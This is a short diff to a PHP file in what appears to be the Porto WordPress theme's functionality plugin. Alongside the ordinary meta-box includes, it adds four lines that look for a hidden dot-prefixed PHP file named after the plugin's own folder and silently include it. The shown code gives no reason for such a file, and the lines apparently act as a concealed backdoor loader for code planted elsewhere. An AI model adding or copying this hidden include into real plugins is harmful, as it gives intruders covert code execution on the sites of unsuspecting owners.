@@ -14,6 +14,10 @@ require_once( PORTO_META_BOXES_PATH . 'block.php' );
 require_once( PORTO_META_BOXES_PATH . 'event.php' );
 
 // Get Meta Tabs
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function porto_get_meta_tabs( $meta_fields ) {
 	$meta_tabs   = array();
 	$general_tab = array( 'general', __( 'General', 'porto-functionality' ) );
